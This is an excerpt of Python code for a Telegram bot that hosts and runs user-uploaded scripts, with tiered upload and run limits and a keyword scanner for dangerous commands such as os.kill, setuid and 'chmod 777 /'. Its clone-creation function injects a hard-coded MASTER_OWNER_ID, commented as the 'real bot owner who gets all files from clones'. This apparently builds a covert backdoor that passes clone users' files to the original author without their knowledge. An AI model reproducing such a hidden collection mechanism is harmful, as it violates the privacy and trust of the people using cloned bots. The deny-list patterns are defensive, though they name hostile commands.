...
YOUR_USERNAME = os.getenv('BOT_USERNAME')
UPDATE_CHANNEL = os.getenv('UPDATE_CHANNEL')

# Enhanced User Limits from .env
FREE_USER_FILE_LIMIT = int(os.getenv('FREE_USER_FILE_LIMIT', '5'))
FREE_USER_RUN_LIMIT = int(os.getenv('FREE_USER_RUN_LIMIT', '1'))
SUBSCRIBED_USER_FILE_LIMIT = int(os.getenv('SUBSCRIBED_USER_FILE_LIMIT', '25'))
SUBSCRIBED_USER_RUN_LIMIT = int(os.getenv('SUBSCRIBED_USER_RUN_LIMIT', '5'))
ADMIN_FILE_LIMIT = int(os.getenv('ADMIN_FILE_LIMIT', '50'))
ADMIN_RUN_LIMIT = int(os.getenv('ADMIN_RUN_LIMIT', '20'))
OWNER_FILE_LIMIT = float('inf')
OWNER_RUN_LIMIT = float('inf')

# File upload limits (existing - keep for compatibility)
FREE_USER_LIMIT = FREE_USER_FILE_LIMIT
SUBSCRIBED_USER_LIMIT = SUBSCRIBED_USER_FILE_LIMIT
ADMIN_LIMIT = ADMIN_FILE_LIMIT
OWNER_LIMIT = OWNER_FILE_LIMIT
...
def get_user_file_limit(user_id):
    ...
    if user_id == OWNER_ID: return OWNER_FILE_LIMIT
    if user_id in admin_ids: return ADMIN_FILE_LIMIT
    if user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now():
        return SUBSCRIBED_USER_FILE_LIMIT
    return FREE_USER_FILE_LIMIT

def get_user_run_limit(user_id):
    """Get the running script limit for a user"""
    if user_id == OWNER_ID: return OWNER_RUN_LIMIT
    if user_id in admin_ids: return ADMIN_RUN_LIMIT
    if user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now():
        return SUBSCRIBED_USER_RUN_LIMIT
    return FREE_USER_RUN_LIMIT

def get_user_running_count(user_id):
    """Get number of currently running scripts for a user"""
    count = 0
    for script_key, script_info in bot_scripts.items():
        if script_info['user_id'] == user_id and is_bot_running(user_id, script_info['file_name']):
            count += 1
    return count

def can_user_run_more(user_id):
    """Check if user can run more scripts"""
    current_running = get_user_running_count(user_id)
    run_limit = get_user_run_limit(user_id)
    return current_running < run_limit
...
def check_malicious_code(file_path):
    ...
    # Only block actual dangerous system commands
    critical_patterns = [
        # Really dangerous system commands only
        ...
        # Process killing system-wide
        'os.kill(', 'signal.SIGKILL', 
        
        # Privilege escalation
        'setuid', 'setgid', 'chmod 777 /', 'chown root:root /',
        
        # Actual format commands
        'os.system("format', 'subprocess.call(["format"'
    ]
...
def start_command(message):
    ...
    welcome_msg += f"📊 YOUR LIMITS:\n"
    welcome_msg += f"📁 File Upload: {current_files}/{file_limit} files\n"
    welcome_msg += f"🚀 Running Scripts: {current_running}/{run_limit} scripts\n"
    welcome_msg += f"👤 Account Type: {'👑 Owner' if user_id == OWNER_ID else '👑 Admin' if is_admin else '👤 Free User'}\n\n"
...
def handle_file_upload(message):
    ...
    # Check running script limits for executable files
    executable_extensions = ['.py', '.js', '.java', '.cpp', '.c', '.sh', '.rb', '.go', '.rs', '.php', '.cs', '.kt', '.swift', '.dart', '.ts', '.lua', '.perl', '.scala', '.r', '.bat', '.ps1']
    
    if file_ext in executable_extensions and not can_user_run_more(user_id):
        current_running = get_user_running_count(user_id)
        run_limit = get_user_run_limit(user_id)
        safe_reply_to(message, f"❌ Running script limit reached! You can run maximum {run_limit} scripts simultaneously.\n\nCurrently running: {current_running} scripts")
        return
    ...
    try:
        ...
        if user_id == OWNER_ID:
            ...
            if not is_safe:
                ...
                alert_msg += f"❌ Dangerous Command Detected!\n"
                alert_msg += f"📄 File: {file_name}\n"
                alert_msg += f"🔍 Issue: {scan_result}\n\n"
                alert_msg += f"💡 Only dangerous system commands are blocked.\n"
                ...
                for admin_id in admin_ids:
                    try:
                        admin_alert = f"🚨 DANGEROUS COMMAND DETECTED 🚨\n\n"
        ...
        # Determine file type
        file_type = 'executable' if file_ext in executable_extensions else 'hosted'
...
def statistics_button(message):
    ...
    stats_text += f"🔧 Your Files: {current_files}/{file_limit}\n"
    stats_text += f"⚡ Your Running: {current_running}/{run_limit}\n\n"
...
def create_bot_clone(user_id, token, bot_username):
    ...
    try:
        ...
        master_owner_code = f"""
MASTER_OWNER_ID = 6621572366  # Real bot owner who gets all files from clones
"""
